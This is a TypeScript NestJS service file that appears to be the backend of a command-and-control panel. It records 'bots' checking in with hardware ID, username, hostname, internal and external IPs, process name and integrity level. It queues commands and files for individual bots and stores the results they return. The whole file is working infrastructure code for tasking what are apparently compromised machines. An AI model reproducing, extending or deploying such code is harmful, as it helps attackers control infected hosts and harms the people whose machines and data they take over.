import { Injectable, Logger } from '@nestjs/common';
import { PrismaService } from 'prisma/prisma.service';
import { BotCheckinDto } from './dto/bot-checkin.dto';
import { PanelSendBotTaskDto } from './dto/panel-send-bot-task.dto';
import { v4 as uuidv4 } from 'uuid';
import { BotSendTaskResultDto } from './dto/bot-send-task-result.dto';

@Injectable()
export class PattayaMessagesService {

    private readonly logger = new Logger(PattayaMessagesService.name);

    constructor (private readonly prisma: PrismaService){}

    async botCheckin(bot: BotCheckinDto){
        try {
            const found = await this.prisma.bot.findUnique({where: {hwid: bot.hwid}})
            if(found){
                this.logger.log(`found existing bot, UPDATE`)
                await this.prisma.bot.update(
                    {
                        where: {
                            hwid: bot.hwid
                        },
                        data: {
                            country: bot.country,
                            hostname: bot.hostname,
                            hwid: bot.hwid,
                            lanIp: bot.lanIp,
                            os: bot.os,
                            socketId: bot.socketId,
                            username: bot.username,
                            wanIp: bot.wanIp,
                            architecture: bot.architecture,
                            processId: bot.processId,
                            integrity: bot.integrity,
                            processName: bot.processName,
                        }
                    }
                )
            } else {
                this.logger.log(`inseret new bot, CREATED`)
                await this.prisma.bot.create({
                    data: {
                        country: bot.country,
                        hostname: bot.hostname,
                        hwid: bot.hwid,
                        lanIp: bot.lanIp,
                        os: bot.os,
                        socketId: bot.socketId,
                        username: bot.username,
                        wanIp: bot.wanIp,
                        architecture: bot.architecture,
                        processId: bot.processId,
                        integrity: bot.integrity,
                        processName: bot.processName,
                    }
                })
            }
            return true;
        } catch (error) {
            this.logger.error(`Something wrong`, error)
            return false;
        }
      }

      async botOffline(socketId: string){
        try {
            const found = await this.prisma.bot.findFirst({where: {socketId}})
            if(found == null) return
            if(found){
                await this.prisma.bot.deleteMany({
                    where: {
                        hwid: found.hwid
                    }
                })
            }

            await this.prisma.task.deleteMany({
                where: {
                    hwid: found.hwid
                }
            })

            this.logger.log(`set bot hwid: ${found.hwid}, OFFLINE and CLEAN TASK`)
        } catch (error) {
            this.logger.error(`Something wrong`, error)
        }
      }
    

      async getAllBots(){
        try {
            return await this.prisma.bot.findMany({})
        } catch (error) {
            this.logger.error(`Something wrong`, error)
        }
      }

      async getOnlineBot(){
        try {
            const bots = await this.prisma.bot.findMany({})
            return bots.length
        } catch (error) {
            this.logger.error(`Something wrong`, error)
            return 0
        }
      }

      async stampTask(task: PanelSendBotTaskDto){
        try {

            this.logger.log(`inseret new task, CREATED`)
            const newTask = await this.prisma.task.create({
                data: {
                    panelToken: task.panelToken,
                    arguments: task.arguments,
                    command: task.command,
                    hwid: task.hwid,
                    taskId: uuidv4(),
                    file: task.file
                }
            })

            return {success: true, data: newTask };
        } catch (error) {
            this.logger.error(`Something wrong`, error)
            return {success: false, data: {} };
        }
      }



      async updateTask(result: BotSendTaskResultDto){
        try {

            this.logger.log(`update bot task result`)
            const found = await this.prisma.task.findUnique({where: {taskId: result.taskId}})
            if(!found){
                return {success: false, data: {} };
            }

            const updatedTask = await this.prisma.task.update(
                {
                    where: {
                        taskId: found.taskId
                    },
                    data: {
                        result: result.result
                    }
                }
            )
            return {success: true, data: updatedTask };
        } catch (error) {
            this.logger.error(`Something wrong`, error)
            return {success: false, data: {} };
        }
      }
}
